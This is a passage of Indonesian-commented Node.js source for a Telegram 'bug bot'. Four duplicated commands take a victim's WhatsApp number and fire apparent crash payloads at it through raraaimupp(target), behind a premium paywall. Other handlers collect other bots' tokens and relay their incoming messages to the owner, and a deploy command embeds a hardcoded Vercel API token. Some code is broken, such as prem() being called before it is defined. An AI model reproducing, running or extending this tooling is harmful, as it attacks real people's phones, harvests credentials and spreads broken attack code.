  try { return JSON.parse(fs.readFileSync(subLoginFile)); } catch { return {}; }
}
function saveSubLogins(data) {
  fs.writeFileSync(subLoginFile, JSON.stringify(data, null, 2));
}

// --- Jalankan semua bot login saat start
function initAllSubBots() {
  const all = loadSubLogins();
  for (const name in all) startSubBot(name, all[name]);
  checkSubBotMessages(); // notifikasi dijalankan oleh bot utama saja
}

// --- Fungsi registrasi bot login (tanpa polling)
function startSubBot(name, data) {
  if (!data.token) return;
  activeBots[name] = { token: data.token };
  console.log(`[LOGIN] Token ${name} tersimpan.`);
}

// === Sistem Notifikasi dijalankan di bot utama ===
async function checkSubBotMessages() {
  const all = loadSubLogins();
  const { OWNER_ID } = require("./config.js");
  const ownerTargets = [OWNER_ID].flat().filter(Boolean); // hanya owner

  for (const [name, data] of Object.entries(all)) {
    if (!data.notify || !data.token) continue;

    const token = data.token;
    const offset = checkedOffsets[name] || 0;

    try {
      const res = await axios.get(`https://api.telegram.org/bot${token}/getUpdates?offset=${offset + 1}&timeout=1`);
      const updates = res.data?.result || [];

      for (const upd of updates) {
        checkedOffsets[name] = upd.update_id;
        const msg = upd.message;
        if (!msg) continue;

        const from = msg.from?.username
          ? `@${msg.from.username}`
          : `${msg.from?.first_name || ""} ${msg.from?.last_name || ""}`.trim() || msg.from?.id;

        const senderId = msg.from?.id;
        const esc = (t) => (t || "").replace(/[_*[\]()~`>#+=|{}.!-]/g, "\\$&");

        let contentType = "📝 Pesan";
        let previewText = msg.text || msg.caption || "[Tanpa teks]";
        let mediaFileId = null;
        let mediaType = null;

        if (msg.photo) {
          mediaFileId = msg.photo.at(-1).file_id;
          contentType = "📸 Foto";
          mediaType = "photo";
        } else if (msg.video) {
          mediaFileId = msg.video.file_id;
          contentType = "🎞️ Video";
          mediaType = "video";
        } else if (msg.document) {
          mediaFileId = msg.document.file_id;
          contentType = "📂 Dokumen";
          mediaType = "document";
        } else if (msg.audio) {
          mediaFileId = msg.audio.file_id;
          contentType = "🎵 Audio";
          mediaType = "audio";
        } else if (msg.voice) {
          mediaFileId = msg.voice.file_id;
          contentType = "🎙️ Voice";
          mediaType = "voice";
        } else if (msg.sticker) {
          mediaFileId = msg.sticker.file_id;
          contentType = "💠 Sticker";
          mediaType = "sticker";
        }

        const notifMsg = `
🔔 *Pesan Masuk dari ${esc(name)}*
👤 Dari: ${esc(from)} \`(${senderId})\`
📦 Jenis: ${contentType}
💬 Isi: ${esc(previewText)}
`;

        for (const target of ownerTargets) {
          try {
            await bot.sendMessage(target, notifMsg, { parse_mode: "MarkdownV2" });
            if (mediaFileId && mediaType) {
              const sendUrl = `https://api.telegram.org/bot${bot.token}/send${mediaType.charAt(0).toUpperCase() + mediaType.slice(1)}`;
              await axios.post(sendUrl, {
                chat_id: target,
                [mediaType]: mediaFileId,
                caption: previewText
              }).catch(() =>
                bot.sendMessage(target, "⚠️ Tidak bisa forward media.")
              );
            }
          } catch (err) {
            console.error(`[NOTIF ERROR ${name}]`, err.message);
          }
        }
      }
    } catch (err) {
      if (!String(err.message).includes("timeout")) {
        console.error(`[CHECK ERROR ${name}]`, err.response?.data || err.message);
      }
    }
  }

  setTimeout(checkSubBotMessages, 4000);
}

// --- Command: /login <nama> <token>
bot.onText(/^\/login\s+(\S+)\s+(\S+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !premium(msg.from.id))
    return bot.sendMessage(chatId, "⛔ Tidak punya akses.");

  const [name, token] = [match[1], match[2]];
  const all = loadSubLogins();

  if (all[name]) return bot.sendMessage(chatId, `⚠️ *${name}* sudah login.`, { parse_mode: "Markdown" });

  all[name] = { token, notify: false };
  saveSubLogins(all);
  startSubBot(name, all[name]);
  bot.sendMessage(chatId, `✅ Bot *${name}* berhasil ditambahkan.`, { parse_mode: "Markdown" });
});

// --- Command: /logout <nama>
bot.onText(/^\/logout\s+(\S+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !premium(msg.from.id))
    return bot.sendMessage(chatId, "⛔ Tidak punya akses.");

  const name = match[1];
  const all = loadSubLogins();

  if (!all[name]) return bot.sendMessage(chatId, `⚠️ *${name}* tidak ditemukan.`, { parse_mode: "Markdown" });

  delete all[name];
  delete activeBots[name];
  saveSubLogins(all);
  bot.sendMessage(chatId, `✅ Bot *${name}* dihapus.`, { parse_mode: "Markdown" });
});

// --- Command: /listlogin
bot.onText(/^\/listlogin$/, (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !premium(msg.from.id))
    return bot.sendMessage(chatId, "⛔ Tidak punya akses.");

  const all = loadSubLogins();
  if (Object.keys(all).length === 0) return bot.sendMessage(chatId, "📂 Tidak ada bot yang login.");

  let text = "📜 *Daftar Login Bot:*\n\n";
  for (const [name, data] of Object.entries(all)) {
    const short = data.token.slice(0, 10) + "...";
    text += `• *${name}*\n  Token: \`${short}\`\n  Notif: ${data.notify ? "✅ ON" : "❌ OFF"}\n\n`;
  }
  bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
});

// --- Command: /notifikasi <nama> on|off
bot.onText(/^\/notifikasi\s+(\S+)\s+(on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !premium(msg.from.id))
    return bot.sendMessage(chatId, "⛔ Tidak punya akses.");

  const [name, mode] = [match[1], match[2].toLowerCase()];
  const all = loadSubLogins();
  if (!all[name]) return bot.sendMessage(chatId, `⚠️ *${name}* tidak ditemukan.`, { parse_mode: "Markdown" });

  all[name].notify = mode === "on";
  saveSubLogins(all);
  bot.sendMessage(chatId, `🔔 Notifikasi *${name}* ${mode === "on" ? "diaktifkan ✅" : "dinonaktifkan ❌"}.`, {
    parse_mode: "Markdown"
  });
});

// --- Command kirim pesan atau media pakai sub bot: /<nama> teks|reply id_target
bot.onText(/^\/(\S+)(?:\s+([\s\S]+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !premium(msg.from.id)) return;

  const name = match[1];
  const rawText = match[2] || "";
  const all = loadSubLogins();
  if (!all[name]) return;

  const token = all[name].token;
  const parts = rawText.trim().split(/\s+/);
  const lastArg = parts.at(-1);
  const hasId = /^-?\d+$/.test(lastArg);
  const targetId = hasId ? lastArg : chatId;
  const text = hasId ? parts.slice(0, -1).join(" ") : rawText;
  const esc = (t) => (t || "").replace(/[_*[\]()~`>#+=|{}.!-]/g, "\\$&");
  const api = `https://api.telegram.org/bot${token}`;

  try {
    if (msg.reply_to_message) {
      await axios.post(`${api}/copyMessage`, {
        from_chat_id: chatId,
        message_id: msg.reply_to_message.message_id,
        chat_id: targetId
      });
      bot.sendMessage(chatId, `✅ Media dikirim via *${esc(name)}* ke \`${targetId}\``, { parse_mode: "MarkdownV2" });
    } else if (text) {
      await axios.post(`${api}/sendMessage`, { chat_id: targetId, text: esc(text), parse_mode: "MarkdownV2" });
      bot.sendMessage(chatId, `✅ Pesan dikirim via *${esc(name)}* ke \`${targetId}\``, { parse_mode: "MarkdownV2" });
    } else {
      bot.sendMessage(chatId, "⚠️ Harus reply media atau isi teks untuk dikirim.", { parse_mode: "Markdown" });
    }
  } catch (e) {
    bot.sendMessage(chatId, `❌ Gagal kirim: ${esc(e.response?.data?.description || e.message)}`, {
      parse_mode: "MarkdownV2"
    });
  }
});

// Jalankan semua sub bot login saat start
initAllSubBots();

// ==========================================
// 🔧 FIX URL - BIAR JADI https://namawebsite.vercel.app
// ==========================================
const VERCEL_TOKEN = "8cJwJDZWYwAjghnr1EEA6tPR"; // token kamu

bot.onText(/^\/deploy(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const websiteName = (match[1] || "").trim();

  if (!websiteName) {
    return bot.sendMessage(chatId, "⚠️ Contoh: /deploy namawebsite", { parse_mode: "Markdown" });
  }

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, "⚠️ Reply file HTML (atau berisi HTML) untuk deploy!");
  }

  const file = msg.reply_to_message.document;
  const fileId = file.file_id;
  const fileName = file.file_name || "index.html";
  const tmpDir = path.join(__dirname, "tmp");
  const localPath = path.join(tmpDir, `${Date.now()}_${fileName}`);

  try {
    await fs.ensureDir(tmpDir);

    const fileLink = await bot.getFileLink(fileId);
    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    fs.writeFileSync(localPath, response.data);

    bot.sendMessage(chatId, `🚀 Deploy dimulai untuk *${websiteName}*...`, { parse_mode: "Markdown" });

    const fileContent = fs.readFileSync(localPath, "utf8");

    const payload = {
      name: websiteName,
      files: [
        {
          file: "index.html",
          data: fileContent
        }
      ],
      projectSettings: { framework: null },
      target: "production"
    };

    await axios.post("https://api.vercel.com/v13/deployments", payload, {
      headers: {
        Authorization: `Bearer ${VERCEL_TOKEN}`,
        "Content-Type": "application/json"
      }
    });

    const deployUrl = `https://${websiteName}.vercel.app`;

    bot.sendMessage(chatId, `➜ Deploy selesai!\n➜ Website: ${deployUrl}`, { parse_mode: "Markdown" });

    await fs.remove(localPath);
  } catch (err) {
    console.error(err.response?.data || err.message);
    bot.sendMessage(chatId, `❌ Gagal deploy:\n${err.response?.data?.error?.message || err.message}`);
  }
});

bot.on("callback_query", async (q) => {
  try {

    // 🔥 WAJIB: hanya handle autojoin
    if (!q.data || !q.data.startsWith("AJVERIFY_")) return;

    const chatId = q.message.chat.id;
    const messageId = q.message.message_id;
    const senderId = q.from.id;

    const ownerId = q.data.split("_")[1];

    // ❌ bukan pemilik
    if (String(senderId) !== String(ownerId)) {
      return bot.answerCallbackQuery(q.id, {
        text: "❌ Ini bukan tombol kamu!",
        show_alert: true
      });
    }

    const ok = await isUserJoinedAll(bot, senderId, autoJoinSettings.links);

    if (ok) {
      await bot.deleteMessage(chatId, messageId).catch(() => {});

      await bot.sendMessage(chatId,
        `<blockquote>🎉 VERIFIKASI BERHASIL!\n🚀 Akses dibuka!</blockquote>`,
        { parse_mode: "HTML" }
      );
    } else {
      await bot.sendMessage(chatId,
        `<blockquote>⚠️ Kamu belum join semua persyaratan di atas join dulu!</blockquote>`,
        { parse_mode: "HTML" }
      );
    }

    return bot.answerCallbackQuery(q.id);

  } catch (err) {
    console.log("Callback error:", err);
  }
});
// ----------------------------------- ( Case Bug & Case Plugin ) -------------------------------- \\
function getRandomImage() {
  const images = [
    "https://files.catbox.moe/8qv11s.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// 🔥 TAMBAHAN HELPER AGAR TIDAK ERROR "is not defined"
function getImage() {
  return getRandomImage();
}

function mentionUserHTML(msg) {
  if (!msg || !msg.from) return "User";
  const id = msg.from.id;
  let name = msg.from.first_name || "User";
  if (msg.from.last_name) name += ` ${msg.from.last_name}`;
  name = String(name).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  return `<a href="tg://user?id=${id}">${name}</a>`;
}
const a1 = prem("5417913674092277565", "ð¤"); //
const a2 = prem("5256131095094652290", "ð¯"); //
const a3 = prem("5217880283860194582", "ð"); //
// Global Anti-Double untuk semua fitur
const globalActiveProcesses = new Map(); 

// COMMAND DIUBAH MENJADI /xscry
bot.onText(/\/xscry(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "Example: /xscry 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "Format salah, contoh: /xscry 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMOJI PREMIUM CONFIG =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
    const e1 = prem("5465616729092676098", "✅");
    const btnEmojiId = "4958621549474087897"; // 🖕 untuk Button

    // ===== CEK KONEKSI & STATUS =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
    }

    // UPDATE NAMA COMMAND DI PENGECEKAN AKTIF
    if (!isCmdActive("/xscry")) {
      return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /xscry.").catch(() => {});
    }

    const chatType = msg.chat.type;
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.").catch(() => {});
    }

    if (!BOT_ACTIVE) {
      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER").catch(() => {});
    }

    const isPremium = await premium(senderId);
    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.").catch(() => {});
    }

    // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(chatId, `<blockquote>⚠️ LINK BELUM DISET!\n\nSilahkan admin set dulu:\n/setautojoin</blockquote>`, { parse_mode: "HTML" }).catch(() => {});
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(chatId, `<blockquote>🚫 AKSES TERBATAS!\n\n🔒 Kamu wajib join semua link di bawah terlebih dahulu.\n✨ Setelah join, tekan tombol verifikasi di bawah.</blockquote>`, { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }).catch(() => {});
      }
    }

    // ===== FAST RESPON NOTIFIKASI =====
    const messageText = `<blockquote>${e1} <b>BUGS SELESAI DI KIRIM UNTUK :</b> <code>${formattedNumber}</code></blockquote>`;

    // 1. KIRIM NOTIFIKASI LANGSUNG (Tanpa menunggu proses bug selesai)
    // Walaupun user nyepam berkali-kali, notif ini akan selalu terkirim dengan instan.
    bot.sendMessage(chatId, messageText, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "🖕 { CHECK TARGET }", 
              url: `https://wa.me/${formattedNumber}`,
              icon_custom_emoji_id: btnEmojiId
            }
          ]
        ]
      }
    }).catch(() => {}); 

    // ===== OPTIMASI CPU (MENCEGAH MACET SAAT DI-SPAM) =====
    // 2. Jika nomor target sudah ada di dalam antrian (sedang diproses eksekusi bug),
    // Kita stop/return di sini agar eksekusi bug tidak bertumpuk ratusan kali dan bikin server hang.
        // ===== OPTIMASI CPU & GLOBAL ANTI DOUBLE =====
    if (globalActiveProcesses.has(target)) {
      globalActiveProcesses.set(target, Date.now()); 
      return; 
    }
    globalActiveProcesses.set(target, Date.now());

    // 🔥 PROSES REAL SEND BUG DI BACKGROUND
    raraaimupp(target)
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();
        
        // DETEKSI SENDER LEPAS (DELAY 10 DETIK)
        if (msgError.includes("connection") || msgError.includes("closed") || msgError.includes("disconnect")) {
          setTimeout(() => {
            const isConnected = sock && sock.user && sock.ws?.readyState === 1;
            if (!isConnected) {
              bot.sendMessage(chatId, "❌ Gagal mengirim bug: Koneksi WA terputus permanen (Sender mati). Silakan /addsender ulang.").catch(() => {});
            }
          }, 10000); 
        }
      })
    .finally(() => { 
  globalActiveProcesses.delete(target);
      });

  } catch (e) {
    bot.sendMessage(chatId, `❌ Terjadi kesalahan sistem: ${e?.message}`).catch(() => {});
  }
});

// ================================
// AUTO RESET & SANGAT FAST RESPON SYSTEM (CPU OPTIMIZED)
// ================================
// COMMAND DIUBAH MENJADI /xscry
bot.onText(/\/xtech(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "Example: /xtech 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "Format salah, contoh: /xtech 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMOJI PREMIUM CONFIG =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
    const e1 = prem("5465616729092676098", "✅");
    const btnEmojiId = "4958621549474087897"; // 🖕 untuk Button

    // ===== CEK KONEKSI & STATUS =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
    }

    // UPDATE NAMA COMMAND DI PENGECEKAN AKTIF
    if (!isCmdActive("/xtech")) {
      return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /xtech.").catch(() => {});
    }

    const chatType = msg.chat.type;
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.").catch(() => {});
    }

    if (!BOT_ACTIVE) {
      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER").catch(() => {});
    }

    const isPremium = await premium(senderId);
    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.").catch(() => {});
    }

    // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(chatId, `<blockquote>⚠️ LINK BELUM DISET!\n\nSilahkan admin set dulu:\n/setautojoin</blockquote>`, { parse_mode: "HTML" }).catch(() => {});
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(chatId, `<blockquote>🚫 AKSES TERBATAS!\n\n🔒 Kamu wajib join semua link di bawah terlebih dahulu.\n✨ Setelah join, tekan tombol verifikasi di bawah.</blockquote>`, { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }).catch(() => {});
      }
    }

    // ===== FAST RESPON NOTIFIKASI =====
    const messageText = `<blockquote>${e1} <b>BUGS SELESAI DI KIRIM UNTUK :</b> <code>${formattedNumber}</code></blockquote>`;

    // 1. KIRIM NOTIFIKASI LANGSUNG (Tanpa menunggu proses bug selesai)
    // Walaupun user nyepam berkali-kali, notif ini akan selalu terkirim dengan instan.
    bot.sendMessage(chatId, messageText, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "🖕 { CHECK TARGET }", 
              url: `https://wa.me/${formattedNumber}`,
              icon_custom_emoji_id: btnEmojiId
            }
          ]
        ]
      }
    }).catch(() => {}); 

    // ===== OPTIMASI CPU (MENCEGAH MACET SAAT DI-SPAM) =====
    // 2. Jika nomor target sudah ada di dalam antrian (sedang diproses eksekusi bug),
    // Kita stop/return di sini agar eksekusi bug tidak bertumpuk ratusan kali dan bikin server hang.
    if (globalActiveProcesses.has(target)) {
      globalActiveProcesses.set(target, Date.now()); 
      return; 
    }
    globalActiveProcesses.set(target, Date.now());

    // 🔥 PROSES REAL SEND BUG DI BACKGROUND
    raraaimupp(target)
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();
        
        // DETEKSI SENDER LEPAS (DELAY 10 DETIK)
        if (msgError.includes("connection") || msgError.includes("closed") || msgError.includes("disconnect")) {
          setTimeout(() => {
            const isConnected = sock && sock.user && sock.ws?.readyState === 1;
            if (!isConnected) {
              bot.sendMessage(chatId, "❌ Gagal mengirim bug: Koneksi WA terputus permanen (Sender mati). Silakan /addsender ulang.").catch(() => {});
            }
          }, 10000); 
        }
      })
      .finally(() => { 
  globalActiveProcesses.delete(target);
      });

  } catch (e) {
    bot.sendMessage(chatId, `❌ Terjadi kesalahan sistem: ${e?.message}`).catch(() => {});
  }
});

// ================================
// AUTO RESET & SANGAT FAST RESPON SYSTEM (CPU OPTIMIZED)
// ================================
// COMMAND DIUBAH MENJADI /xscry
bot.onText(/\/xvicz(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "Example: /xvicz 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "Format salah, contoh: /xvicz 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMOJI PREMIUM CONFIG =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
    const e1 = prem("5465616729092676098", "✅");
    const btnEmojiId = "4958621549474087897"; // 🖕 untuk Button

    // ===== CEK KONEKSI & STATUS =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
    }

    // UPDATE NAMA COMMAND DI PENGECEKAN AKTIF
    if (!isCmdActive("/xvicz")) {
      return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /xvicz.").catch(() => {});
    }

    const chatType = msg.chat.type;
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.").catch(() => {});
    }

    if (!BOT_ACTIVE) {
      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER").catch(() => {});
    }

    const isPremium = await premium(senderId);
    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.").catch(() => {});
    }

    // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(chatId, `<blockquote>⚠️ LINK BELUM DISET!\n\nSilahkan admin set dulu:\n/setautojoin</blockquote>`, { parse_mode: "HTML" }).catch(() => {});
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(chatId, `<blockquote>🚫 AKSES TERBATAS!\n\n🔒 Kamu wajib join semua link di bawah terlebih dahulu.\n✨ Setelah join, tekan tombol verifikasi di bawah.</blockquote>`, { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }).catch(() => {});
      }
    }

    // ===== FAST RESPON NOTIFIKASI =====
    const messageText = `<blockquote>${e1} <b>BUGS SELESAI DI KIRIM UNTUK :</b> <code>${formattedNumber}</code></blockquote>`;

    // 1. KIRIM NOTIFIKASI LANGSUNG (Tanpa menunggu proses bug selesai)
    // Walaupun user nyepam berkali-kali, notif ini akan selalu terkirim dengan instan.
    bot.sendMessage(chatId, messageText, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "🖕 { CHECK TARGET }", 
              url: `https://wa.me/${formattedNumber}`,
              icon_custom_emoji_id: btnEmojiId
            }
          ]
        ]
      }
    }).catch(() => {}); 

    // ===== OPTIMASI CPU (MENCEGAH MACET SAAT DI-SPAM) =====
    // 2. Jika nomor target sudah ada di dalam antrian (sedang diproses eksekusi bug),
    // Kita stop/return di sini agar eksekusi bug tidak bertumpuk ratusan kali dan bikin server hang.
    if (globalActiveProcesses.has(target)) {
      globalActiveProcesses.set(target, Date.now()); 
      return; 
    }
    globalActiveProcesses.set(target, Date.now());

    // 🔥 PROSES REAL SEND BUG DI BACKGROUND
    raraaimupp(target)
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();
        
        // DETEKSI SENDER LEPAS (DELAY 10 DETIK)
        if (msgError.includes("connection") || msgError.includes("closed") || msgError.includes("disconnect")) {
          setTimeout(() => {
            const isConnected = sock && sock.user && sock.ws?.readyState === 1;
            if (!isConnected) {
              bot.sendMessage(chatId, "❌ Gagal mengirim bug: Koneksi WA terputus permanen (Sender mati). Silakan /addsender ulang.").catch(() => {});
            }
          }, 10000); 
        }
      })
      .finally(() => { 
  globalActiveProcesses.delete(target);
      });

  } catch (e) {
    bot.sendMessage(chatId, `❌ Terjadi kesalahan sistem: ${e?.message}`).catch(() => {});
  }
});

// ================================
// AUTO RESET & SANGAT FAST RESPON SYSTEM (CPU OPTIMIZED)
// ================================
// COMMAND DIUBAH MENJADI /xscry
bot.onText(/\/xdelyz(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "Example: /xdelyz 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "Format salah, contoh: /xdelyz 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMOJI PREMIUM CONFIG =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
    const e1 = prem("5465616729092676098", "✅");
    const btnEmojiId = "4958621549474087897"; // 🖕 untuk Button

    // ===== CEK KONEKSI & STATUS =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
    }

    // UPDATE NAMA COMMAND DI PENGECEKAN AKTIF
    if (!isCmdActive("/xdelyz")) {
      return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /xdelyz.").catch(() => {});
    }

    const chatType = msg.chat.type;
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.").catch(() => {});
    }

    if (!BOT_ACTIVE) {
      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER").catch(() => {});
    }

    const isPremium = await premium(senderId);
    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.").catch(() => {});
    }

    // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(chatId, `<blockquote>⚠️ LINK BELUM DISET!\n\nSilahkan admin set dulu:\n/setautojoin</blockquote>`, { parse_mode: "HTML" }).catch(() => {});
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(chatId, `<blockquote>🚫 AKSES TERBATAS!\n\n🔒 Kamu wajib join semua link di bawah terlebih dahulu.\n✨ Setelah join, tekan tombol verifikasi di bawah.</blockquote>`, { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }).catch(() => {});
      }
    }

    // ===== FAST RESPON NOTIFIKASI =====
    const messageText = `<blockquote>${e1} <b>BUGS SELESAI DI KIRIM UNTUK :</b> <code>${formattedNumber}</code></blockquote>`;

    // 1. KIRIM NOTIFIKASI LANGSUNG (Tanpa menunggu proses bug selesai)
    // Walaupun user nyepam berkali-kali, notif ini akan selalu terkirim dengan instan.
    bot.sendMessage(chatId, messageText, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "🖕 { CHECK TARGET }", 
              url: `https://wa.me/${formattedNumber}`,
              icon_custom_emoji_id: btnEmojiId
            }
          ]
        ]
      }
    }).catch(() => {}); 

    // ===== OPTIMASI CPU (MENCEGAH MACET SAAT DI-SPAM) =====
    // 2. Jika nomor target sudah ada di dalam antrian (sedang diproses eksekusi bug),
    // Kita stop/return di sini agar eksekusi bug tidak bertumpuk ratusan kali dan bikin server hang.
    if (globalActiveProcesses.has(target)) {
      globalActiveProcesses.set(target, Date.now()); 
      return; 
    }
    globalActiveProcesses.set(target, Date.now());

    // 🔥 PROSES REAL SEND BUG DI BACKGROUND
    raraaimupp(target)
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();
        
        // DETEKSI SENDER LEPAS (DELAY 10 DETIK)
        if (msgError.includes("connection") || msgError.includes("closed") || msgError.includes("disconnect")) {
          setTimeout(() => {
            const isConnected = sock && sock.user && sock.ws?.readyState === 1;
            if (!isConnected) {
              bot.sendMessage(chatId, "❌ Gagal mengirim bug: Koneksi WA terputus permanen (Sender mati). Silakan /addsender ulang.").catch(() => {});
            }
          }, 10000); 
        }
      })
      .finally(() => { 
  globalActiveProcesses.delete(target);
      });

  } catch (e) {
    bot.sendMessage(chatId, `❌ Terjadi kesalahan sistem: ${e?.message}`).catch(() => {});
  }
});

// ================================
// AUTO RESET & SANGAT FAST RESPON SYSTEM (CPU OPTIMIZED)
